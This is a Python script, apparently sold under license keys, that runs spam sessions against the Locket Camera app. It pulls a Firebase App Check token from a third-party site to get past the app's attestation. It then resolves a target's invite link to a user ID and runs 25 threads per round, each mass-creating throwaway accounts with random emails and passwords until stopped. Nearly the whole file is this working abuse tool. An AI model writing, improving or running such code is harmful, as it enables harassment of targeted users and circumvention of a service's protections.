# spammer.py

import requests
import re
import random
import string
import threading
import time
from typing import Optional, Callable
import json

class SpamManager:
    def __init__(self, account_id: str, product_token: str):
        self.ACCOUNT_ID = account_id
        # **QUAN TRỌNG**: Product token không được dùng trong validate-key, nó sẽ được dùng trong các tác vụ khác.
        # Hàm validate-key không cần đến nó.
        self.PRODUCT_TOKEN = product_token 
        self.TOKEN_API_URL = "https://thanhdieu.com/api/v1/locket/token"
        self.API_LOCKET_URL = "https://api.locketcamera.com"
        self.REQUEST_TIMEOUT = 15

        self.FIREBASE_APP_CHECK_TOKEN = self._fetch_app_check_token()
        if not self.FIREBASE_APP_CHECK_TOKEN:
            print("CRITICAL: Không thể lấy App Check Token từ API, chức năng spam sẽ thất bại.")

        self.active_spam_sessions = {}

    def _fetch_app_check_token(self):
        """Tự động lấy App Check Token từ API."""
        try:
            print("Đang lấy Locket App Check Token...")
            res = requests.get(self.TOKEN_API_URL, timeout=self.REQUEST_TIMEOUT)
            if res.status_code == 200:
                data = res.json()
                if data.get("code") == 200 and "token" in data.get("data", {}):
                    token = data["data"]["token"]
                    print(f"Lấy App Check Token thành công: ...{token[-10:]}")
                    return token
            print("Lấy App Check Token thất bại, response không hợp lệ.")
            return None
        except requests.RequestException as e:
            print(f"Lỗi khi lấy App Check Token: {e}")
            return None

    def validate_license(self, key: str) -> dict:
        """
        Gửi yêu cầu đến Keygen.sh để xác thực một license key.
        PHIÊN BẢN NÀY CÓ LOG CHI TIẾT.
        """
        print("\n\n--- [VALIDATION_DEBUG] BẮT ĐẦU QUÁ TRÌNH XÁC THỰC LICENSE ---")
        
        license_key_to_validate = key.strip()
        print(f"--- [VALIDATION_DEBUG] Key nhận được từ người dùng (đã xóa khoảng trắng): '{license_key_to_validate}'")

        headers = {
            'Content-Type': 'application/vnd.api+json',
            'Accept': 'application/vnd.api+json'
        }
        payload = {'meta': {'key': license_key_to_validate}}
        url = f'https://api.keygen.sh/v1/accounts/{self.ACCOUNT_ID}/licenses/actions/validate-key'
        
        print(f"--- [VALIDATION_DEBUG] Account ID đang sử dụng: {self.ACCOUNT_ID}")
        print(f"--- [VALIDATION_DEBUG] URL đích sẽ gửi request: {url}")
        print(f"--- [VALIDATION_DEBUG] Payload (dữ liệu) sẽ gửi đi: {json.dumps(payload)}")
        print("--- [VALIDATION_DEBUG] Đang gửi request đến Keygen.sh...")

        try:
            res = requests.post(url, headers=headers, json=payload, timeout=self.REQUEST_TIMEOUT)
            
            print("--- [VALIDATION_DEBUG] ĐÃ NHẬN ĐƯỢC PHẢN HỒI TỪ KEYGEN.SH ---")
            print(f"--- [VALIDATION_DEBUG] Status Code: {res.status_code}")
            print(f"--- [VALIDATION_DEBUG] Raw Response Body (nội dung thô): {res.text}")
            
            data = res.json()

            if "errors" in data:
                print("--- [VALIDATION_DEBUG] Phân tích: Phát hiện có 'errors' trong response. Validation thất bại.")
                code = data["errors"][0].get("code")
                return {"valid": False, "code": code}
            
            if data.get("meta", {}).get("valid", False):
                print("--- [VALIDATION_DEBUG] Phân tích: Phát hiện 'valid: true' trong response. Validation thành công!")
                expiry = data.get("data", {}).get("attributes", {}).get("expiry")
                return {"valid": True, "code": "VALID", "expiry": expiry}
            else:
                print("--- [VALIDATION_DEBUG] Phân tích: Không có 'errors' nhưng 'valid' không phải true. Validation thất bại.")
                return {"valid": False, "code": "NOT_FOUND"}

        except requests.RequestException as e:
            print(f"--- [VALIDATION_DEBUG] Phân tích: Đã xảy ra lỗi ngoại lệ trong lúc gửi request: {e}")
            return {"valid": False, "code": "REQUEST_ERROR"}
        finally:
            print("--- [VALIDATION_DEBUG] KẾT THÚC QUÁ TRÌNH XÁC THỰC ---\n\n")

    def _extract_uid_locket(self, url: str) -> Optional[str]:
        """Trích xuất UID từ URL Locket."""
        url = url.strip()
        if not re.match(r'^https?://', url):
             url = f"https://locket.cam/{url}"
        try:
            resp = requests.get(url, allow_redirects=True, timeout=self.REQUEST_TIMEOUT)
            final_url = resp.url
            match = re.search(r'locket\.camera/invites/([a-zA-Z0-9]{28})', final_url)
            return match.group(1) if match else None
        except requests.RequestException:
            return None

    def _run_single_spam_thread(self, target_uid, stop_event, stats):
        """Logic cốt lõi của một luồng spam."""
        if not self.FIREBASE_APP_CHECK_TOKEN:
            stats['failed'] += 1
            return
            
        try:
            headers = {'Content-Type': 'application/json', 'X-Firebase-AppCheck': self.FIREBASE_APP_CHECK_TOKEN}
            email = f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=15))}@thanhdieu.com"
            password = 'zlocket' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=7))
            
            create_payload = {"data": {"email": email, "password": password, "client_email_verif": True, "platform": "ios"}}
            create_res = requests.post(f"{self.API_LOCKET_URL}/createAccountWithEmailPassword", headers=headers, json=create_payload, timeout=self.REQUEST_TIMEOUT)
            
            if stop_event.is_set(): return
            
            if create_res.status_code == 200:
                stats['success'] += 1
            else:
                stats['failed'] += 1
        except requests.RequestException:
            if not stop_event.is_set():
                stats['failed'] += 1

    def start_spam_session(self, user_id: int, target: str, update_callback: Callable):
        """Bắt đầu một phiên spam."""
        target_uid = self._extract_uid_locket(target)
        if not target_uid:
            update_callback(status="error", message=f"Không thể tìm thấy Locket UID từ `{target}`.")
            return

        if user_id in self.active_spam_sessions:
            update_callback(status="error", message="Bạn đã có một phiên spam đang chạy.")
            return

        stop_event = threading.Event()
        self.active_spam_sessions[user_id] = stop_event
        stats = {'success': 0, 'failed': 0, 'start_time': time.time()}

        def spam_loop():
            last_update_time = time.time()
            while not stop_event.is_set():
                threads = []
                for _ in range(25): # Chạy 25 luồng mỗi đợt
                    if stop_event.is_set(): break
                    thread = threading.Thread(target=self._run_single_spam_thread, args=(target_uid, stop_event, stats))
                    thread.start()
                    threads.append(thread)
                
                for t in threads: t.join()

                if time.time() - last_update_time > 5:
                    update_callback(status="running", stats=stats)
                    last_update_time = time.time()

            update_callback(status="stopped", stats=stats)
            if user_id in self.active_spam_sessions: del self.active_spam_sessions[user_id]

        session_thread = threading.Thread(target=spam_loop)
        session_thread.daemon = True
        session_thread.start()
        
        update_callback(status="started", message=f"✅ Đã bắt đầu phiên spam tới target UID: `{target_uid}`.")

    def stop_spam_session(self, user_id: int) -> bool:
        """Dừng một phiên spam của người dùng."""
        if user_id in self.active_spam_sessions:
            self.active_spam_sessions[user_id].set()
            return True
        return False
